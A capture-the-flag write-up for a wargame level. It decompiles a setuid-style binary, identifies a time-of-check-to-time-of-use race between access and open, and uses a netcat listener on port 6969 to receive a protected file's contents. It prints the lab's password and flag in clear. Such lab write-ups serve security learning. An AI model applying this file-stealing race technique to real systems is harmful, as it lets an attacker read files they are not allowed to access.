# level10

1. examinate existing files permissions

```shell
ls -la
```

shows that the level10 executable belongs to flag10 group, token is flag10:flag10

2. get the executable (from an external device)

```shell
scp -P 4242 level10@<host>:level10 .
```

3. decompile the executable and examine the resulting code

```shell
~/dev/tools/retdec/bin/retdec-decompiler.py level10
```

it seems like the executable reads specified file then sends it to specified host on port 6969, using an access / open flow, which is a vulnerability since we can modify the file between the access and the open

4. testing the above supposition with a sample file and netcat

```shell
echo test > /tmp/test
```

```shell
nc -l 6969
```

```shell
./level10 /tmp/test 127.0.0.1
```

Shows that we can receive the content of specified file with netcat

5. Just copy the 2 shell programs in /tmp and chmod +x them, then launch both to exploit access / open vulnerability and receive the password with netcat

```shell
nc -klv 6969
```

gives flag10's password: `woupa2yuojeeaaed06riuj63c`

6. pwn the flag

```shell
su flag10
```

```shell
getflag
```

gives flag: `feulo4b72j7edeahuete3no7c`
